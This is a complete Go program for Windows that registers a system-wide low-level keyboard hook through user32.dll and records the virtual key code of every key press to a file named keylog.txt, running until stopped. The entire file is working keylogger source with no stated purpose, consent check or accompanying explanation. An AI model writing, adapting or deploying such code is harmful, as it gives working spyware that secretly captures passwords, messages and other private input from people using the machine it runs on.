//go:build windows
// +build windows

package main

import (
	"fmt"
	"os"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	user32                  = windows.NewLazySystemDLL("user32.dll")
	procSetWindowsHookExW   = user32.NewProc("SetWindowsHookExW")
	procCallNextHookEx      = user32.NewProc("CallNextHookEx")
	procUnhookWindowsHookEx = user32.NewProc("UnhookWindowsHookEx")
	procGetMessageW         = user32.NewProc("GetMessageW")
)

const (
	WH_KEYBOARD_LL = 13
	WM_KEYDOWN     = 0x0100
)

type (
	HHOOK           uintptr
	WPARAM          uintptr
	LPARAM          uintptr
	KBDLLHOOKSTRUCT struct {
		VkCode      uint32
		ScanCode    uint32
		Flags       uint32
		Time        uint32
		DwExtraInfo uintptr
	}
	MSG struct {
		HWnd    uintptr
		Message uint32
		WParam  WPARAM
		LParam  LPARAM
		Time    uint32
		Pt      struct {
			X, Y int32
		}
	}
)

var (
	hook    HHOOK
	logFile *os.File
)

func SetWindowsHookEx(idHook int, lpfn uintptr, hMod uintptr, dwThreadId uint32) (HHOOK, error) {
	ret, _, err := procSetWindowsHookExW.Call(
		uintptr(idHook),
		lpfn,
		hMod,
		uintptr(dwThreadId),
	)
	if ret == 0 {
		return 0, err
	}
	return HHOOK(ret), nil
}

func CallNextHookEx(hhk HHOOK, nCode int, wParam WPARAM, lParam LPARAM) uintptr {
	ret, _, _ := procCallNextHookEx.Call(
		uintptr(hhk),
		uintptr(nCode),
		uintptr(wParam),
		uintptr(lParam),
	)
	return ret
}

func UnhookWindowsHookEx(hhk HHOOK) bool {
	ret, _, _ := procUnhookWindowsHookEx.Call(uintptr(hhk))
	return ret != 0
}

func GetMessage(msg *MSG, hwnd uintptr, msgFilterMin uint32, msgFilterMax uint32) int {
	ret, _, _ := procGetMessageW.Call(
		uintptr(unsafe.Pointer(msg)),
		hwnd,
		uintptr(msgFilterMin),
		uintptr(msgFilterMax),
	)
	return int(ret)
}

func HookCallback(nCode int, wParam WPARAM, lParam LPARAM) uintptr {
	if nCode >= 0 && wParam == WM_KEYDOWN {
		kbdStruct := (*KBDLLHOOKSTRUCT)(unsafe.Pointer(lParam))
		fmt.Fprintf(logFile, "%d\n", kbdStruct.VkCode)
	}
	return CallNextHookEx(hook, nCode, wParam, lParam)
}

func main() {
	var err error
	logFile, err = os.OpenFile("keylog.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Printf("Failed to open log file: %v\n", err)
		return
	}
	defer logFile.Close()

	hook, err = SetWindowsHookEx(WH_KEYBOARD_LL, syscall.NewCallback(HookCallback), 0, 0)
	if err != nil {
		fmt.Printf("Failed to set hook: %v\n", err)
		return
	}
	defer UnhookWindowsHookEx(hook)

	var msg MSG
	for GetMessage(&msg, 0, 0, 0) != 0 {
		time.Sleep(10 * time.Millisecond)
	}
}
